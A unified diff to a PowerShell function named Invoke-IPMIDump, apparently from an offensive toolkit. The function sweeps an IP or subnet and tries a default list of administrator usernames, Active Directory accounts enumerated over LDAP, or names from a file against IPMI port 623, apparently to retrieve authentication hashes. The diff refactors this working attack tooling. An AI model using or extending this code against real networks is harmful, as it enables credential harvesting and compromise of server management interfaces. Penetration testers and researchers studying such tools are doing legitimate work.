@@ -1,4 +1,3 @@
-
 function Get-SubnetAddresses {
     Param (
         [IPAddress]$IP,
@@ -248,6 +247,37 @@ function Invoke-IPMIDump {
         [int]$Port = 623
     )
 
+    function Get-DomainUsers {
+        $directoryEntry = [ADSI]"LDAP://$env:USERDNSDOMAIN"
+        $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
+        $searcher.PageSize = 1000
+        if ($IncludeDisabled) {
+            $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(SamAccountName=*))"
+        }
+        else {
+            $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(SamAccountName=*))"
+        }
+        $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
+
+        try {
+            $results = $searcher.FindAll()
+            $results | ForEach-Object {
+                $samAccountName = $_.Properties["samAccountName"][0]
+                if ($samAccountName -ne $null) {
+                    $samAccountName
+                }
+            }
+        }
+        catch {
+            Write-Error "Failed to query Active Directory: $_"
+            return $null
+        }
+    }
+
+    if ($Users -eq "Domain Users") {
+        $IPMIUsers = Get-DomainUsers
+    }
+
     if ($IP.Contains("/")) {
         $mb = $IP.Split("/")[1]
         $IP = $IP.Split("/")[0]
@@ -257,34 +287,17 @@ function Invoke-IPMIDump {
     else {
         $ipAddresses = @($IP)
     }
+
     foreach ($ip in $ipAddresses) {
-    
+        $global:IPMI_halt = $false
         if ([string]::IsNullOrEmpty($Users)) {
-            [String[]]$users = @(
-    
-                "Admin",
-                "admin",
-                "administrator",
-                "ADMIN",
-                "root",
-                "USERID",
-                "ipmiadmin",
-                "superuser",
-                "operator",
-                "service",
-                "support",
-                "guest",
-                "default",
-                "system",
-                "remote",
-                "supervisor",
-                "tech",
-                "Administrator",
-                "manager",
-                "test"
+            $IPMIUsers = @(
+                "Admin", "admin", "administrator", "ADMIN", "root", "USERID",
+                "ipmiadmin", "superuser", "operator", "service", "support",
+                "guest", "default", "system", "remote", "supervisor", "tech",
+                "Administrator", "manager", "test"
             )
-            $global:IPMI_halt = $false
-            foreach ($user in $users) {
+            foreach ($user in $IPMIUsers) {
                 if ($global:IPMI_halt) { break }
                 $res = Attempt-Retrieve -User $user -Port $Port -IP $ip
                 if ($res -eq -111) {
@@ -292,55 +305,20 @@ function Invoke-IPMIDump {
                 }
             }
         }
-    
-    
         elseif ($Users -eq "Domain Users") {
-    
-            function Get-EnabledDomainUsers {
-                $directoryEntry = [ADSI]"LDAP://$env:USERDNSDOMAIN"
-                $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
-                $searcher.PageSize = 1000
-                if ($IncludeDisabled) { $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(SamAccountName=*)(!userAccountControl:1.2.840.113556.1.4.803:=16))" }
-                else { $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(SamAccountName=*)(!userAccountControl:1.2.840.113556.1.4.803:=16))" }
-                $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
-    
-                try {
-                    $results = $searcher.FindAll()
-                    $enabledUsers = $results | ForEach-Object {
-                        $samAccountName = $_.Properties["samAccountName"][0]
-                        if ($samAccountName -ne $null) {
-                            $samAccountName
-                        }
-                    }
-                    return $enabledUsers
-                }
-                catch {
-                    Write-Error "Failed to query Active Directory: $_"
-                    return $null
-        
-                }
-            }
-
-            $EnabledDomainUsers = Get-EnabledDomainUsers
-
-            $global:IPMI_halt = $false
-            foreach ($user in $EnabledDomainUsers) {
+            foreach ($user in $IPMIUsers) {
                 if ($global:IPMI_halt) { break }
-
                 $res = Attempt-Retrieve -User $user -Port $Port -IP $ip
                 if ($res -eq -111) {
                     break
-        
                 }
             }
         }
-
-
         else {
             if ([System.IO.File]::Exists($Users)) {
-                foreach ($User in Get-Content $Users) {
+                Get-Content $Users | ForEach-Object {
                     Start-Sleep -Milliseconds 100
-                    $res = Attempt-Retrieve -User $User -Port $Port -IP $ip
+                    $res = Attempt-Retrieve -User $_ -Port $Port -IP $ip
                     if ($res -eq -111) {
                         break
                     }
@@ -348,8 +326,7 @@ function Invoke-IPMIDump {
             }
             else {
                 Attempt-Retrieve -User $Users -Port $Port -IP $ip
-            
             }
-        }        
+        }
     }
 }
